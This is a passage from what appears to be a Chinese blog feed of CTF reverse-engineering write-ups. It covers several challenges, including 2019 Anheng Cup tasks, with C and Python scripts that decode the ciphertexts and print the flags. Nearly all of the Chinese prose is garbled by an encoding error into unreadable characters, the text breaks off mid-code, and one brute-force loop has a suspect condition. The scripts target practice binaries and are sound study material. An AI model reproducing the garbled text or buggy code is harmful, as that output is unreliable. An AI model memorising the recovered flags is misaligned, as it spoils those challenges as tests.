alt="image-20210504210119852"></p><p>æ˜¾ç„¶ï¼Œä¸Šé¢çš„&amp;è¿ç®—æ˜¯ä¸å¯é€†çš„ï¼Œæ•°å­—ç”µè·¯å­¦è¿‡è¿™ç§åŒ–ç®€çš„ï¼Œå¯¹ä¸Šé¢å¯è¿›è¡Œå¦‚ä¸‹çš„åŒ–ç®€ï¼šæœ€åå°±æ˜¯ä¸€ä¸ªå¼‚æˆ–ã€‚</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20210504165847724.png" alt="image-20210504165847724"></p><p>æœ€åå¼€å§‹ç”¨Cè¯­è¨€å†™äº†ä¸€ä¸ªå¸¸è§„çš„ç§»ä½è¿˜åŸï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x000001A9</span>, <span class="number">0x00000233</span>, <span class="number">0x00000179</span>, <span class="number">0x0000017F</span>, <span class="number">0x000001A5</span>, <span class="number">0x000002C6</span>, <span class="number">0x00000137</span>, <span class="number">0x00000358</span>, </span><br><span class="line">    <span class="number">0x000000E1</span>, <span class="number">0x00000305</span>, <span class="number">0x000003EC</span>, <span class="number">0x00000153</span>, <span class="number">0x0000015D</span>, <span class="number">0x00000247</span>, <span class="number">0x0000017B</span>, <span class="number">0x00000201</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>], cnt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">flag[cnt++] = (a[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">flag[cnt++] = ((a[<span class="number">0</span>]&amp;<span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | (a[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">flag[cnt++] = ((a[<span class="number">1</span>]&amp;<span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) | (a[<span class="number">2</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">flag[cnt++] = ((a[<span class="number">2</span>]&amp;<span class="number">0x3f</span>) &lt;&lt; <span class="number">2</span>) | (a[<span class="number">3</span>] &gt;&gt; <span class="number">8</span>);  </span><br><span class="line">flag[cnt++] = a[<span class="number">3</span>] &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">enc[i] ^= <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">decode(enc+<span class="number">4</span>*i);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ba5e_and_x0r_1s_fun!</span></span><br></pre></td></tr></table></figure><p>å…¶å®è¿™ç§ç”¨pythonå¤„ç†èµ·æ¥æ˜¯ååˆ†æ–¹ä¾¿çš„ï¼Œä¹Ÿé€šç”¨ã€‚é¦–å…ˆæå–å‡ºæ‰€æœ‰çš„äºŒè¿›åˆ¶ä½ï¼Œç„¶åæ ¹æ®åˆ†é…åŸåˆ™ï¼Œè¿˜åŸå°±å¥½äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x000001A9</span>, <span class="number">0x00000233</span>, <span class="number">0x00000179</span>, <span class="number">0x0000017F</span>, <span class="number">0x000001A5</span>, <span class="number">0x000002C6</span>, <span class="number">0x00000137</span>, <span class="number">0x00000358</span>, <span class="number">0x000000E1</span>, <span class="number">0x00000305</span>, <span class="number">0x000003EC</span>, <span class="number">0x00000153</span>, <span class="number">0x0000015D</span>, <span class="number">0x00000247</span>, <span class="number">0x0000017B</span>, <span class="number">0x00000201</span>]</span><br><span class="line">enc = [bin(enc[i]^<span class="number">0x20</span>)[<span class="number">2</span>:].zfill(<span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc))]</span><br><span class="line">enc = <span class="string">''</span>.join(enc)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc), <span class="number">8</span>):</span><br><span class="line">    flag += chr(int(enc[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019å®‰æ´µæ¯</title>
      <link href="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å­¦ä¹ é€†å‘ä¹‹åï¼Œåœ¨githubæ‰¾é¢˜ç›®è¿›è¡Œå¤ç°çš„ã€‚</p></blockquote><a id="more"></a><h2 id="Easy-Encryption"><a href="#Easy-Encryption" class="headerlink" title="Easy_Encryption"></a>Easy_Encryption</h2><p>æç¤ºå¾ˆå¤šï¼Œç›´æ¥æ‰¾åˆ°mainå‡½æ•°ï¼Œç®€å•åˆ†æä¸€ä¸‹ï¼Œå¯¹è¾“å…¥flagè¿›è¡Œ2ä¸ªåŠ å¯†å‡½æ•°åï¼Œæœ€åä¸ä¸€ä¸ªå·²çŸ¥å¯†æ–‡æ¯”è¾ƒã€‚å…¶ä¸­ç¬¬äºŒä¸ªæ˜æ˜¾çš„base64åŠ å¯†ã€‚</p><p>æ¥åˆ°ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œç”±äºidaæ ˆé¡¶åˆ†æå¤±è´¥å¯¼è‡´ï¼Œç›´æ¥alt+kä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815162136204.png" alt="image-20200815162136204"></p><p>æ„‰å¿«çš„çœ‹ä¼ªä»£ç ï¼Œä¸€ä¸ªæ³¨æ„çš„åœ°æ–¹ï¼š<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815162346063.png" alt="image-20200815162346063"></p><p>ç›´æ¥ç®€å•çš„çˆ†ç ´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"artqkoehqpkbihv"</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> base[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; base[i]; i++)</span><br><span class="line">base[i] = <span class="built_in">abs</span>(base[i]<span class="number">-97</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= s[i]; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line"><span class="keyword">if</span>((j+base[i]<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span> == s[i])</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag: umpnineissogood</span></span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>idaè½½å…¥åï¼Œå‘ç°ä¼ªä»£ç ååˆ†éš¾çœ‹ã€‚ã€‚ã€‚çœ‹äº†ä¸€ä¼šå„¿ï¼Œå®åœ¨ä¸æƒ³åˆ†æäº†ï¼Œæ‰€æœ‰å‡½æ•°éƒ½æ˜¯ä¸€ç§å½¢å¼ï¼Œæ„Ÿè§‰æ˜¯ä»€ä¹ˆæ··æ·†ä»£ç çš„æŠ€æœ¯ã€‚</p><p>ç™¾åº¦åï¼Œå‘ç°æ˜¯ollvmï¼Œæ§åˆ¶æµå¹³å¦åŒ–æŠ€æœ¯ã€‚</p><blockquote><p>æ§åˆ¶æµå¹³å¦åŒ–(control flow flattening)çš„åŸºæœ¬æ€æƒ³ä¸»è¦æ˜¯é€šè¿‡ä¸€ä¸ªä¸»åˆ†å‘å™¨æ¥æ§åˆ¶ç¨‹åºåŸºæœ¬å—çš„æ‰§è¡Œæµç¨‹ï¼Œè¿™ä¸ªä¸»åˆ†å‘å™¨å°±æ˜¯å‡½æ•°ä¸­çš„switchè¯­å¥ã€‚</p></blockquote><p>ä¸”ç›®å‰å¯ä»¥åˆ©ç”¨ç¬¦å·æ‰§è¡Œæ¥å»é™¤æ§åˆ¶æµå¹³å¦åŒ–ã€‚<a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">åˆ©ç”¨ç¬¦å·æ‰§è¡Œå»é™¤æ§åˆ¶æµå¹³å¦åŒ–</a></p><p>è€Œè¿™ä¹Ÿéœ€è¦angrï¼Œç½‘ä¸Šè¯´çš„éƒ½æ˜¯å»ºè®®å®‰è£…åœ¨pythonè™šæ‹Ÿç¯å¢ƒä¸­ã€‚</p><p>è·Ÿç€æ•™ç¨‹å®‰è£…å®Œè™šæ‹Ÿç¯å¢ƒå¹¶åˆ›å»ºåï¼Œä½†angråˆå®‰è£…å¤±è´¥ã€‚ã€‚ã€‚åé¢å‘ç°è¿˜å¯ä»¥ç›´æ¥ç”¨dokcerã€‚</p><p>äº†è§£ä¸€æ³¢dockerï¼Œ<a href="https://www.cnblogs.com/blog-rui/p/11244023.html" target="_blank" rel="noopener">docker</a>ï¼ŒæŠ˜è…¾ä¸€äº›æ—¶é—´ï¼ˆè°·æ­Œå¤§æ³•å¸®äº†å¤§å¿™ğŸ‘ï¼‰åæˆåŠŸæ‰§è¡Œdeflat.pyè„šæœ¬ã€‚<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815165930112.png" alt="image-20200815165930112"></p><p>åˆæ˜¯æ„‰å¿«çš„ä¼ªä»£ç ï¼Œç®€å•å°±ä¸åˆ†æäº†ï¼Œä½¿ç”¨gdbåŠ¨è°ƒå‡º2ä¸ªå¯¹æ¯”çš„æ•°ç‹¬è¡¨ï¼Œæ‰¾å‡ºå·®å¼‚çš„æ•°å­—ï¼Œå³0æ‰€åœ¨ä½ç½®ã€‚<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815170400494.png" alt="image-20200815170400494"></p><p>ç„¶åä½¿ç”¨notepad++æ‰¾ä¸ä¸åŒï¼š<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815170436332.png" alt="image-20200815170436332"></p><p>æœ€åç®€å•è§£å¯†ä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"4693641762894685722843556137219876255986"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">33</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((j&amp;<span class="number">0xf3</span> | ~j&amp;<span class="number">0xc</span>)<span class="number">-20</span>) == s[i])</span><br><span class="line">&#123;</span><br><span class="line">s[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp = s[i];</span><br><span class="line">s[i] = s[i+<span class="number">1</span>];</span><br><span class="line">s[i+<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">strlen</span>(s)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s)/<span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp = s[k];</span><br><span class="line">s[k] = s[i];</span><br><span class="line">s[i] = temp;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag: KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</span></span><br></pre></td></tr></table></figure><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>æ‰“å¼€ç¨‹åºï¼Œå‡ºç°hookedï¼Œè¡¨ç¤ºå·²ç»å¯¹ç¨‹åºä¸­çš„çš„å‡½æ•°hookæˆåŠŸã€‚</p><p>è€Œä¹‹å‰æˆ‘ä¹Ÿåœ¨é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ä¸€ä¹¦ä¸­çœ‹åˆ°è¿‡è¯¥ç« èŠ‚çš„ä¸€ç‚¹å†…å®¹ï¼Œå®ƒçš„ä»‹ç»ï¼š</p><blockquote><p><strong>ä»£ç é€†å‘åˆ†æä¸­ï¼Œé’©å–ï¼ˆhookingï¼‰æ˜¯ä¸€ç§æˆªå–ä¿¡æ¯ï¼Œæ›´æ”¹ç¨‹åºæµç¨‹ï¼Œæ·»åŠ æ–°åŠŸèƒ½çš„æŠ€æœ¯ã€‚</strong></p></blockquote><p>idaä¸­æ‰¾åˆ°mainå‡½æ•°åï¼Œä¼šå‘ç°å¾ˆå¥‡æ€ªï¼Œæœ‰ä¸€ä¸ªå¼‚å¸¸ï¼Œä¸”æ²¡æœ‰æ“ä½œè¾“å…¥flagçš„å‡½æ•°ï¼ŒçŒœæµ‹æ˜¯hookæ”¹å˜äº†ç¨‹åºçš„ç¨‹åºæµç¨‹ã€‚ä½†å¯ä»¥é€šè¿‡æ•°æ®äº¤å‰å¼•ç”¨æ‰¾åˆ°å…³é”®å‡½æ•°ã€‚</p><p>çœ‹äº†ä¸€ä¸‹æ‰€æœ‰ä¸è®¡ç®—è¾“å…¥æ•°æ®ä¸æ¯”è¾ƒæ•°æ®ç›¸å…³çš„å‡½æ•°ï¼Œäº†è§£å¤§è‡´æµç¨‹åï¼ŒODè¿›è¡ŒåŠ¨è°ƒçœ‹çœ‹ï¼š</p><p>å…¶ä¸­mainå‡½æ•°ä¸­çš„MessageBoxå‡½æ•°æ‰§è¡Œåå¹¶æ²¡æœ‰æ­£å¸¸çš„æ‰§è¡Œï¼Œè€Œæ˜¯è·³åˆ°äº†ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œä¹Ÿæ˜¯idaä¸­åˆ†æè¿‡çš„è¿‡æ•°æ®åŠ å¯†çš„å‡½æ•°ã€‚ç»“åˆidaç»§ç»­åŠ¨è°ƒï¼š<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815173123252.png" alt="image-20200815173123252"></p><p>ODä¸­çœ‹åˆ°è·³åˆ°çš„mainå‡½æ•°è§¦å‘å¼‚å¸¸çš„åœ°æ–¹ï¼Œä½†æ˜¯ç¨‹åºæ— æ³•å¤„ç†çš„å¼‚å¸¸ã€‚ã€‚ã€‚<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815173417257.png" alt="image-20200815173417257"></p><p>é‚£ä¸Šå›¾ä¸­çš„<strong>TopLevelExceptionFilter</strong>å…³é”®åŠ å¯†å‡½æ•°ä¸æ‰§è¡Œçš„å˜›ã€‚ã€‚ä½¿ç”¨PEtoolsæ¥dumpå‡ºæ­£å¸¸æ‰§è¡Œçš„ç¨‹åºçœ‹åˆ°æ•°æ®æ”¹å˜äº†çš„ï¼Œé‚£æ˜¯æ‰§è¡Œäº†çš„ã€‚ã€‚</p><p>ç™¾åº¦ä¸€ä¸‹<strong>SetUnhandledExceptionFilter(TopLevelExceptionFilter)</strong>å‡½æ•°ï¼š<strong>ç®€å•æ¥è¯´å°±æ˜¯è®¾ç½®ä¸€ä¸ªå‘ç”Ÿå¼‚å¸¸å¤„ç†çš„å‡½æ•°ï¼Œä¸”å®ƒä¼šå°†åŸæ¥é»˜è®¤å¤„ç†å¼‚å¸¸çš„å‡½æ•°hookæ‰ã€‚ä¸”æˆ‘ä»¬çš„ç¨‹åºè¦ä¸å¤„äºè°ƒè¯•çŠ¶æ€æ‰ä¼šå»æ‰§è¡Œå®ƒè®¾ç½®çš„å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚<a href="https://blog.csdn.net/xiaoyafang123/article/details/52161106" target="_blank" rel="noopener">ä»‹ç»</a></strong> </p><p>å‚æ•°ï¼šlpTopLevelExceptionFilter å‡½æ•°æŒ‡é’ˆã€‚å½“å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œä¸”ç¨‹åºä¸å¤„äºè°ƒè¯•æ¨¡å¼ï¼ˆåœ¨vsæˆ–è€…åˆ«çš„è°ƒè¯•å™¨é‡Œè¿è¡Œï¼‰åˆ™é¦–å…ˆè°ƒç”¨è¯¥å‡½æ•°ã€‚<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815175235431.png" alt="image-20200815175235431"></p><p>ç¨‹åºæµç¨‹æ¸…æ¥šäº†ï¼Œå¼€å§‹åˆ†æç®—æ³•ï¼š</p><p>ç¬¬äºŒä¸ªåŠ å¯†å‡½æ•°å˜ç§çš„base64ï¼Œä½†ç¬¬ä¸€ä¸ªçœ‹ä¸å‡ºä»€ä¹ˆåå ‚ï¼Œè‡ªå·±é€†çš„è¯æ„Ÿè§‰å·¥ç¨‹é‡è‚¯å®šå¤§ä¸”å¾ˆå¤§å‡ ç‡æä¸å‡ºæ¥ã€‚ã€‚</p><p>å°±æƒ³ç€å…ˆæŠŠå˜ç§çš„base64å…ˆè§£å¯†ï¼Œä½†ä¸€ç›´è§£å¯†ä¹±ç ã€‚ã€‚ä¸èƒ½å•Šï¼Œè‡ªå·±ä¹Ÿå†™äº†2ä¸ªå‡½æ•°æ¥æµ‹è¯•ï¼Œèƒ½å°†å˜ç§åŠ å¯†çš„base64è¿˜åŸä¸ºæ­£å¸¸base64åŠ å¯†çš„ï¼Œä½†é¢˜ä¸­çš„å¯†æ–‡ä¸è¡Œï¼Œã€‚ã€‚</p><p>æ¨¡æ‹Ÿæœ¬é¢˜çš„å˜ç§base64åŠ å¯†ï¼ˆä¹Ÿæ˜¯ä»æ¨¡æ‹Ÿå‘ç°æ˜¯base64çš„ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+E4h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+F0h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+FCh] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+108h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+114h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+120h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+12Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+138h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> str[] = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span>;</span><br><span class="line">  <span class="keyword">char</span> Str[] = <span class="string">"123456"</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( v8 % <span class="number">3</span> )</span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>) + <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*(v9+<span class="number">1</span>));</span><br><span class="line">  v7[v9] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j )</span><br><span class="line">      v3 |= (<span class="keyword">unsigned</span> __int8)Str[j + i] &lt;&lt; <span class="number">8</span> * (<span class="number">2</span> - j);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( k &gt;= <span class="number">4</span> - (i + <span class="number">3</span> - v8) &amp;&amp; i + <span class="number">3</span> &gt; v8 )</span><br><span class="line">        v7[v5] = <span class="string">'!'</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        temp = (((v3 &gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - k)) &amp; <span class="number">0x3F</span>)+<span class="number">24</span>)%<span class="number">64</span>, v7[v5] = str[temp], <span class="built_in">printf</span>(<span class="string">"%d "</span>, temp);;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">puts</span>(v7); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åŠ å¯†åï¼šKRGlLBSo</span></span><br></pre></td></tr></table></figure><p>è¿˜åŸæˆæ­£å¸¸åŠ å¯†çš„base64å¯†æ–‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"KRGlLBSo"</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"><span class="keyword">char</span> a1[] = &#123;<span class="number">20</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">14</span>, <span 